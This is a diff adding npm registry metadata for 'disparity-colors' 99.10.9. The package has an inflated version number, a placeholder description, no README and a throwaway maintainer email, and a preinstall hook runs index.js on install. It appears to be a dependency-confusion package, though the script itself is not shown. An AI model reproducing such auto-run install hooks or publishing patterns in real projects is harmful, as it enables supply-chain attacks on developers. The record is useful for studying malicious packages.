@@ -1,0 +1,62 @@
+{
+    "_id": "disparity-colors",
+    "name": "disparity-colors",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "disparity-colors",
+            "version": "99.10.9",
+            "description": "azbit package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "disparity-colors@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-+rnpXZExArNn6IaV/dlBPDzCHy/jW1eSRVzRODmy+3LX2LkNu1Uva7rq5xd91SpLLrtGoxTmfaI3YOjcZ8haGQ==",
+                "shasum": "42f9708c4b6138448e6f9f6fa4e44aecb5077cdf",
+                "tarball": "https://registry.npmjs.org/disparity-colors/-/disparity-colors-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5068,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiPK9OACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmqAPhAAgPOWr17dXsdfY2+v9IaVqcJMbx6PPRA+eob0cysSg5jwUMVf\r\nwUXJ59+pKYGlQr1qxx21C1+m48rL3O5yKEXe/32jBWXs0cdQDPDMTy2sOrYQ\r\npl+WMY2i4q9Piv1lf4jhHyx1i5TNk2/oRKseWduis9tw8eEBxFbxt7VUlrrW\r\n2ha/n2k9975DMRoRv5PrCY6+mv2mmFjWri482pyVgxw50XmULj5YaaL2O/ja\r\nZFk5aIwtzI9Vpmlnq+jCLErj184PgalL3/wOGVoQKPN9srB25Rrlcp47+evz\r\nCLn8c4noc1OM4k//Wqplynaxj7cz+ni9bzv+Net6MnCyVg6XWn/We1Q876m7\r\nVBZeamVtdQxIPbOoRwspYOM8bKXxNK2tQrp2m7aNGmKteP8EgmsOOnkQxBlM\r\nofBnVfzlgUHct4ojve67lO7UBI8UZEsIe9/fXXgkd+vcNUFrNPHipkoA27kn\r\n2sBei4tBcVSz9dffI+Fq6mJqk/CVl1NRcHYD9xuAcfO6GiC+fupvY9e/8WUP\r\neMudqd6x37lSiPRtm+LdLnkBVTDyJkbsgCy/+kctQ8O5NwqfjYbzBZk9X+4E\r\nCOFhX8FdtHAF3ixuMdCf3vmWsn8y6V1EzBnrEL03nS+xLl80bD/mP3EwR1pS\r\nJAnV+VA+DYFY0crW7+gkzreRIVPdZ25IyyY=\r\n=EKfB\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "hc291lbv",
+                "email": "hc291lbv@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "hc291lbv",
+                    "email": "hc291lbv@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/disparity-colors_99.10.9_1648144206739_0.8010019511115973"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-24T17:50:06.739Z",
+        "99.10.9": "2022-03-24T17:50:06.882Z",
+        "modified": "2022-03-24T17:50:07.072Z"
+    },
+    "maintainers": [
+        {
+            "name": "hc291lbv",
+            "email": "hc291lbv@rt11.ml"
+        }
+    ],
+    "description": "azbit package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
